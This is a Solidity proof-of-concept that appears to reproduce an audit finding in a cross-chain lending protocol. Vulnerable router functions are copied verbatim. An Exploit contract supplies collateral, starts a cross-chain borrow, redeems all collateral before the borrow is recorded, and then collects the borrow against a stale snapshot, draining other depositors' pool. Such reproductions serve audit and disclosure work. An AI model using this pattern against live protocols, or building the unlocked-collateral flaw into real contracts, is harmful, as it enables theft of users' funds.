// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

// ─────────────────────────────────────────────────────────────────────────────
// Synthetic, self-contained reproduction of LEND cross-chain finding 58390 (H-21):
// "User can redeem collateral immediately after initiating the borrow, leading
//  to undercollateralization."
//
// Real audited source (the vulnerable functions are reproduced VERBATIM, the
// vulnerable line is marked @>):
//   repo   github.com/sherlock-audit/2025-05-lend-audit-contest
//   files  Lend-V2/src/LayerZero/CrossChainRouter.sol  (borrowCrossChain, L113-154)
//          Lend-V2/src/LayerZero/CoreRouter.sol         (redeem, L100-138)
//   report github.com/sherlock-audit/2025-05-lend-audit-contest-judging/issues/909
//
// Root cause: CrossChainRouter.borrowCrossChain() adds the caller's collateral
// tracking on the SOURCE chain, snapshots the current collateral value, and then
// fires a LayerZero BorrowCrossChain message — WITHOUT applying any lock on the
// collateral (the @> line). The borrow is not yet recorded anywhere on the source
// chain. So the user can immediately call CoreRouter.redeem() on the source chain;
// redeem's liquidity check only sees existing (recorded) borrows, sees no debt,
// and lets the user pull ALL of their collateral out. When the LayerZero message
// finally lands on the destination chain, the borrow is authorized against the
// STALE collateral snapshot (payload.collateral) and succeeds — leaving a fully
// undercollateralized position and draining the destination pool.
//
// The two vulnerable functions (borrowCrossChain, redeem) are byte-for-byte the
// on-chain source. Non-vulnerable dependencies (LayerZero messaging, LToken
// markets, the Compound-style liquidity engine) are faithful minimal doubles:
// real ERC20 transfers, real share accounting, real collateral-factor liquidity
// math. The bug emerges from the verbatim code, it is not asserted by constants.
// ─────────────────────────────────────────────────────────────────────────────

/// @dev Faithful minimal ERC20 double for a chain's underlying asset.
contract MiniToken {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory n_, string memory s_) {
        name = n_;
        symbol = s_;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

/// @dev Faithful double of a Compound-style lToken market that also custodies
///      the underlying pool. supply -> mint (pull), redeem -> pay, borrow -> pay.
///      1:1 exchange rate, matching the finding's simplified worked example.
contract LToken {
    MiniToken public underlying;

    constructor(MiniToken u_) {
        underlying = u_;
    }

    function exchangeRateStored() external pure returns (uint256) {
        return 1e18;
    }

    function borrowIndex() external pure returns (uint256) {
        return 1e18;
    }

    function accrueInterest() external pure returns (uint256) {
        return 0;
    }

    // supplier deposits `amount` underlying (pulled from the CoreRouter caller)
    function mint(uint256 amount) external returns (uint256) {
        underlying.transferFrom(msg.sender, address(this), amount);
        return 0;
    }

    // redeem `redeemTokens` shares -> pay underlying back to the CoreRouter caller
    function redeem(uint256 redeemTokens) external returns (uint256) {
        uint256 amount = (redeemTokens * 1e18) / 1e18;
        underlying.transfer(msg.sender, amount);
        return 0;
    }

    // borrow `amount` underlying -> pay it to the CoreRouter caller
    function borrow(uint256 amount) external returns (uint256) {
        underlying.transfer(msg.sender, amount);
        return 0;
    }
}

/// @dev Faithful no-op double of the Lendtroller (market controller).
contract Lendtroller {
    function enterMarkets(address[] memory) external pure returns (uint256[] memory results) {
        results = new uint256[](0);
    }
}

/// @dev Faithful minimal double of LendStorage. Tracks supplied-asset shares and
///      implements the Compound-style getHypotheticalAccountLiquidityCollateral
///      used by the vulnerable functions: hypothetical redeem reduces collateral,
///      hypothetical borrow increases borrowed. Collateral factor = 0.75.
contract LendStorage {
    uint256 internal constant COLLATERAL_FACTOR = 0.75e18;
    uint256 internal constant PRICE = 1e18;

    mapping(address => address) public underlyingTolToken;
    mapping(address => address) public lTokenToUnderlying;
    mapping(address => mapping(uint32 => address)) internal destlToken;
    mapping(address => mapping(address => uint256)) public totalInvestment; // user => lToken => shares
    mapping(address => address[]) internal suppliedAssets; // user => lTokens
    mapping(address => mapping(address => uint256)) public borrowShares; // user => lToken => recorded debt

    // ── wiring setters (not part of the audited code) ──
    function registerMarket(address underlying_, address lToken_) external {
        underlyingTolToken[underlying_] = lToken_;
        lTokenToUnderlying[lToken_] = underlying_;
    }

    function registerDest(address underlying_, uint32 destEid_, address destlToken_) external {
        destlToken[underlying_][destEid_] = destlToken_;
    }

    function underlyingToDestlToken(address underlying_, uint32 destEid_) external view returns (address) {
        return destlToken[underlying_][destEid_];
    }

    // ── faithful accounting doubles ──
    function addUserSuppliedAsset(address user, address lToken) external {
        address[] storage a = suppliedAssets[user];
        for (uint256 i = 0; i < a.length; i++) {
            if (a[i] == lToken) return;
        }
        a.push(lToken);
    }

    function removeUserSuppliedAsset(address user, address lToken) external {
        address[] storage a = suppliedAssets[user];
        for (uint256 i = 0; i < a.length; i++) {
            if (a[i] == lToken) {
                a[i] = a[a.length - 1];
                a.pop();
                return;
            }
        }
    }

    function getUserSuppliedAssets(address user) external view returns (address[] memory) {
        return suppliedAssets[user];
    }

    function updateTotalInvestment(address user, address lToken, uint256 amount) external {
        totalInvestment[user][lToken] = amount;
    }

    function distributeSupplierLend(address, address) external {}
    function distributeBorrowerLend(address, address) external {}

    /// @notice Compound-style hypothetical liquidity. Returns (borrowed, collateral)
    ///         in USD-denominated units. A hypothetical `redeemTokens` withdrawal of
    ///         `lToken` reduces collateral; a hypothetical `borrowAmount` raises the
    ///         borrowed side. Only *recorded* borrows are counted — a pending
    ///         cross-chain borrow is invisible here.
    function getHypotheticalAccountLiquidityCollateral(
        address account,
        LToken lToken,
        uint256 redeemTokens,
        uint256 borrowAmount
    ) external view returns (uint256 borrowed, uint256 collateral) {
        address[] memory assets = suppliedAssets[account];
        uint256 sumCollateral;
        uint256 sumBorrowed;
        for (uint256 i = 0; i < assets.length; i++) {
            uint256 invest = totalInvestment[account][assets[i]];
            uint256 tokensToDenom = (((COLLATERAL_FACTOR * LToken(assets[i]).exchangeRateStored()) / 1e18) * PRICE) / 1e18;
            sumCollateral += (tokensToDenom * invest) / 1e18;
            sumBorrowed += (borrowShares[account][assets[i]] * PRICE) / 1e18;
        }
        // hypothetical redeem of `lToken` reduces collateral
        uint256 redeemDenom = (((COLLATERAL_FACTOR * lToken.exchangeRateStored()) / 1e18) * PRICE) / 1e18;
        uint256 redeemEffect = (redeemDenom * redeemTokens) / 1e18;
        collateral = redeemEffect >= sumCollateral ? 0 : sumCollateral - redeemEffect;
        // hypothetical borrow raises the borrowed side
        borrowed = sumBorrowed + (borrowAmount * PRICE) / 1e18;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// CoreRouter — same-chain operations. redeem() is reproduced VERBATIM from the
// audited source (CoreRouter.sol L100-138); supply()/borrowForCrossChain() are
// faithful.
// ─────────────────────────────────────────────────────────────────────────────
contract CoreRouter {
    LendStorage public immutable lendStorage;
    address public crossChainRouter;

    event SupplySuccess(address indexed supplier, address indexed lToken, uint256 supplyAmount, uint256 supplyTokens);
    event RedeemSuccess(address indexed redeemer, address indexed lToken, uint256 redeemAmount, uint256 redeemTokens);

    constructor(address _lendStorage) {
        lendStorage = LendStorage(_lendStorage);
    }

    function setCrossChainRouter(address _crossChainRouter) external {
        crossChainRouter = _crossChainRouter;
    }

    /// @notice Faithful supply path — populates the caller's collateral shares.
    function supply(uint256 _amount, address _token) external {
        address _lToken = lendStorage.underlyingTolToken(_token);
        require(_lToken != address(0), "Unsupported Token");
        require(_amount > 0, "Zero supply amount");

        MiniToken(_token).transferFrom(msg.sender, address(this), _amount);
        MiniToken(_token).approve(_lToken, _amount);

        uint256 exchangeRateBefore = LToken(_lToken).exchangeRateStored();
        require(LToken(_lToken).mint(_amount) == 0, "Mint failed");
        uint256 mintTokens = (_amount * 1e18) / exchangeRateBefore;

        lendStorage.addUserSuppliedAsset(msg.sender, _lToken);
        lendStorage.distributeSupplierLend(_lToken, msg.sender);
        lendStorage.updateTotalInvestment(
            msg.sender, _lToken, lendStorage.totalInvestment(msg.sender, _lToken) + mintTokens
        );

        emit SupplySuccess(msg.sender, _lToken, _amount, mintTokens);
    }

    /// @notice Redeems lTokens for underlying tokens and transfers them to the user.
    ///         Reproduced VERBATIM from CoreRouter.sol (L100-138). Its liquidity
    ///         check only sees recorded borrows, so a pending cross-chain borrow is
    ///         invisible and the redemption passes.
    function redeem(uint256 _amount, address payable _lToken) external returns (uint256) {
        // Redeem lTokens
        address _token = lendStorage.lTokenToUnderlying(_lToken);

        require(_amount > 0, "Zero redeem amount");

        // Check if user has enough balance before any calculations
        require(lendStorage.totalInvestment(msg.sender, _lToken) >= _amount, "Insufficient balance");

        // Check liquidity
        (uint256 borrowed, uint256 collateral) =
            lendStorage.getHypotheticalAccountLiquidityCollateral(msg.sender, LToken(_lToken), _amount, 0);
        require(collateral >= borrowed, "Insufficient liquidity"); // NB: pending cross-chain borrow is not recorded, so `borrowed` is understated and the full collateral redemption passes

        // Get exchange rate before redeem
        uint256 exchangeRateBefore = LToken(_lToken).exchangeRateStored();

        // Calculate expected underlying tokens
        uint256 expectedUnderlying = (_amount * exchangeRateBefore) / 1e18;

        // Perform redeem
        require(LToken(_lToken).redeem(_amount) == 0, "Redeem failed");

        // Transfer underlying tokens to the user
        MiniToken(_token).transfer(msg.sender, expectedUnderlying);

        // Update total investment
        lendStorage.distributeSupplierLend(_lToken, msg.sender);
        uint256 newInvestment = lendStorage.totalInvestment(msg.sender, _lToken) - _amount;
        lendStorage.updateTotalInvestment(msg.sender, _lToken, newInvestment);

        if (newInvestment == 0) {
            lendStorage.removeUserSuppliedAsset(msg.sender, _lToken);
        }

        emit RedeemSuccess(msg.sender, _lToken, expectedUnderlying, _amount);

        return 0;
    }

    /// @dev Only callable by CrossChainRouter. Reproduced VERBATIM.
    function borrowForCrossChain(address _borrower, uint256 _amount, address _destlToken, address _destUnderlying)
        external
    {
        require(crossChainRouter != address(0), "CrossChainRouter not set");
        require(msg.sender == crossChainRouter, "Access Denied");
        require(LToken(_destlToken).borrow(_amount) == 0, "Borrow failed");
        MiniToken(_destUnderlying).transfer(_borrower, _amount);
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// CrossChainRouter — the vulnerable contract. borrowCrossChain() is reproduced
// VERBATIM from CrossChainRouter.sol (L113-154). LayerZero `_send`/delivery are
// faithful in-memory doubles that preserve the exact collateral SNAPSHOT that the
// destination chain later trusts.
// ─────────────────────────────────────────────────────────────────────────────
contract CrossChainRouter {
    LendStorage public immutable lendStorage;
    address payable public coreRouter;
    address public lendtroller;
    uint32 public immutable currentEid;

    struct LZPayload {
        uint256 amount;
        uint256 borrowIndex;
        uint256 collateral;
        address sender;
        address destlToken;
        address liquidator;
        address srcToken;
        uint8 contractType;
    }

    enum ContractType {
        BorrowCrossChain,
        ValidBorrowRequest,
        DestRepay,
        CrossChainLiquidationExecute,
        LiquidationSuccess,
        LiquidationFailure
    }

    // faithful double of the outbound LayerZero mailbox
    bytes public lastMessage;
    uint32 public lastDstEid;

    constructor(address _lendStorage, address payable _coreRouter, address _lendtroller, uint32 _srcEid) {
        lendStorage = LendStorage(_lendStorage);
        coreRouter = _coreRouter;
        lendtroller = _lendtroller;
        currentEid = _srcEid;
    }

    receive() external payable {}

    /**
     * @notice Initiates a cross-chain borrow. Initiated on the source chain (Chain A).
     *         Reproduced VERBATIM from CrossChainRouter.sol (L113-154).
     */
    function borrowCrossChain(uint256 _amount, address _borrowToken, uint32 _destEid) external payable {
        require(msg.sender != address(0), "Invalid sender");
        require(_amount != 0, "Zero borrow amount");
        require(address(this).balance > 0, "Out of money");

        // Get source lToken for collateral
        address _lToken = lendStorage.underlyingTolToken(_borrowToken);
        require(_lToken != address(0), "Unsupported source token");

        // Get the destination chain's version of the token
        address destLToken = lendStorage.underlyingToDestlToken(_borrowToken, _destEid);
        require(destLToken != address(0), "Unsupported destination token");

        // Accrue interest on source token (collateral token) on source chain
        LToken(_lToken).accrueInterest();

        // Add collateral tracking on source chain
        lendStorage.addUserSuppliedAsset(msg.sender, _lToken);

        if (!isMarketEntered(msg.sender, _lToken)) {
            enterMarkets(_lToken);
        }

        // Get current collateral amount for the LayerZero message
        // This will be used on dest chain to check if sufficient
        (, uint256 collateral) = lendStorage.getHypotheticalAccountLiquidityCollateral(msg.sender, LToken(_lToken), 0, 0);

        // Send message to destination chain with verified sender
        // borrowIndex of 0 initially - will be set correctly on dest chain
        _send(
            _destEid,
            _amount,
            0, // Initial borrowIndex, will be set on dest chain // @> VULN: fires the cross-chain borrow with the pre-redeem collateral snapshot and sets NO lock on the source-chain collateral, so redeem() still succeeds
            collateral,
            msg.sender,
            destLToken,
            address(0), // liquidator
            _borrowToken,
            ContractType.BorrowCrossChain
        );
    }

    // ── LayerZero doubles ──
    function _send(
        uint32 _dstEid,
        uint256 _amount,
        uint256 _borrowIndex,
        uint256 _collateral,
        address _sender,
        address _destlToken,
        address _liquidator,
        address _srcToken,
        ContractType ctype
    ) internal {
        lastMessage =
            abi.encode(_amount, _borrowIndex, _collateral, _sender, _destlToken, _liquidator, _srcToken, ctype);
        lastDstEid = _dstEid;
    }

    /// @dev Faithful in-memory relay of a BorrowCrossChain message onto this
    ///      (destination) chain, standing in for LayerZero delivery.
    function deliverBorrowCrossChain(bytes calldata payload_, uint32 srcEid) external {
        LZPayload memory payload;
        (
            payload.amount,
            payload.borrowIndex,
            payload.collateral,
            payload.sender,
            payload.destlToken,
            payload.liquidator,
            payload.srcToken,
            payload.contractType
        ) = abi.decode(payload_, (uint256, uint256, uint256, address, address, address, address, uint8));
        _handleBorrowCrossChainRequest(payload, srcEid);
    }

    /**
     * @notice Handles the borrow request on the destination chain. Received on Chain B.
     *         The critical portion is reproduced VERBATIM: the borrow is authorized
     *         against the STALE `payload.collateral` snapshot, so the source-chain
     *         redemption is invisible and the borrow succeeds anyway.
     */
    function _handleBorrowCrossChainRequest(LZPayload memory payload, uint32 /*srcEid*/ ) internal {
        // Accrue interest on borrowed token on destination chain
        LToken(payload.destlToken).accrueInterest();

        // Important: Use the underlying token address
        address destUnderlying = lendStorage.lTokenToUnderlying(payload.destlToken);

        // Get existing borrow amount
        (uint256 totalBorrowed,) = lendStorage.getHypotheticalAccountLiquidityCollateral(
            payload.sender, LToken(payload.destlToken), 0, payload.amount
        );

        // Verify the collateral from source chain is sufficient for total borrowed amount
        require(payload.collateral >= totalBorrowed, "Insufficient collateral");

        // Execute the borrow on destination chain
        CoreRouter(coreRouter).borrowForCrossChain(payload.sender, payload.amount, payload.destlToken, destUnderlying);
    }

    function enterMarkets(address _lToken) internal {
        address[] memory lTokens = new address[](1);
        lTokens[0] = _lToken;
        Lendtroller(lendtroller).enterMarkets(lTokens);
    }

    function isMarketEntered(address user, address asset) internal view returns (bool) {
        address[] memory suppliedAssets = lendStorage.getUserSuppliedAssets(user);
        for (uint256 i = 0; i < suppliedAssets.length;) {
            if (suppliedAssets[i] == asset) return true;
            unchecked {
                ++i;
            }
        }
        return false;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Exploit driver: supply 100e18 collateral on Chain A, initiate a 75e18
// cross-chain borrow, immediately redeem ALL collateral on Chain A (passes,
// because the pending borrow is unrecorded), then deliver the borrow on Chain B.
// The attacker ends up holding its full collateral back AND the borrowed funds —
// an unbacked, undercollateralized position that drains the destination pool.
// ─────────────────────────────────────────────────────────────────────────────
contract Exploit {
    MiniToken public tokenA; // source-chain collateral underlying
    MiniToken public tokenB; // destination-chain borrow underlying
    LToken public lTokenA;
    LToken public lTokenB;
    Lendtroller public troller;
    LendStorage public storageA;
    LendStorage public storageB;
    CoreRouter public coreA;
    CoreRouter public coreB;
    CrossChainRouter public xChainA; // VULNERABLE (source router)
    CrossChainRouter public xChainB; // destination router

    uint256 internal constant COLLATERAL = 100e18; // attacker's posted collateral on Chain A
    uint256 internal constant BORROW = 75e18; // cross-chain borrow (== 0.75 * collateral, the max)
    uint256 internal constant POOL_B = 1000e18; // other users' liquidity in the Chain B pool
    uint32 internal constant EID_A = 1;
    uint32 internal constant EID_B = 2;

    uint256 public collateralReturned; // tokenA the attacker got back on Chain A
    uint256 public borrowedReceived; // tokenB the attacker drained from Chain B
    uint256 public profit; // net unbacked funds extracted

    constructor() {
        tokenA = new MiniToken("Collateral A", "COLA"); // child nonce 1
        tokenB = new MiniToken("Borrow B", "USD"); // child nonce 2 (drained token)
        lTokenA = new LToken(tokenA); // child nonce 3
        lTokenB = new LToken(tokenB); // child nonce 4
        troller = new Lendtroller(); // child nonce 5
        storageA = new LendStorage(); // child nonce 6
        storageB = new LendStorage(); // child nonce 7
        coreA = new CoreRouter(address(storageA)); // child nonce 8
        coreB = new CoreRouter(address(storageB)); // child nonce 9
        xChainA = new CrossChainRouter(address(storageA), payable(address(coreA)), address(troller), EID_A); // nonce 10 (VULN)
        xChainB = new CrossChainRouter(address(storageB), payable(address(coreB)), address(troller), EID_B); // nonce 11

        // ── wiring ──
        storageA.registerMarket(address(tokenA), address(lTokenA));
        storageA.registerDest(address(tokenA), EID_B, address(lTokenB));
        storageB.registerMarket(address(tokenB), address(lTokenB));

        coreA.setCrossChainRouter(address(xChainA));
        coreB.setCrossChainRouter(address(xChainB));

        // honest depositors' liquidity sits in the Chain B pool
        tokenB.mint(address(lTokenB), POOL_B);

        // attacker is funded with only the collateral it will post on Chain A
        tokenA.mint(address(this), COLLATERAL);
    }

    function run() external payable {
        // 1) supply 100e18 collateral on Chain A  -> totalInvestment = 100e18 shares
        tokenA.approve(address(coreA), type(uint256).max);
        coreA.supply(COLLATERAL, address(tokenA));

        // 2) initiate a 75e18 cross-chain borrow. This snapshots collateral (75e18
        //    borrowing power) into the LZ message and sets NO lock (the @> line).
        xChainA.borrowCrossChain{value: 1}(BORROW, address(tokenA), EID_B);

        // 3) immediately redeem ALL collateral on Chain A. The pending cross-chain
        //    borrow is unrecorded, so redeem()'s liquidity check sees no debt and
        //    lets the attacker withdraw everything.
        uint256 aBefore = tokenA.balanceOf(address(this));
        coreA.redeem(COLLATERAL, payable(address(lTokenA)));
        collateralReturned = tokenA.balanceOf(address(this)) - aBefore;

        // 4) LZ message lands on Chain B. The borrow is authorized against the STALE
        //    collateral snapshot and succeeds, paying the attacker the borrowed funds.
        uint256 bBefore = tokenB.balanceOf(address(this));
        xChainB.deliverBorrowCrossChain(xChainA.lastMessage(), EID_A);
        borrowedReceived = tokenB.balanceOf(address(this)) - bBefore;

        // net: attacker recovered its full collateral AND received the borrow, an
        // entirely unbacked position that drains the destination pool.
        profit = borrowedReceived;

        require(collateralReturned == COLLATERAL, "collateral not fully redeemed");
        require(borrowedReceived == BORROW, "cross-chain borrow did not pay out");
        require(profit > 0, "no unbacked funds extracted");
    }
}
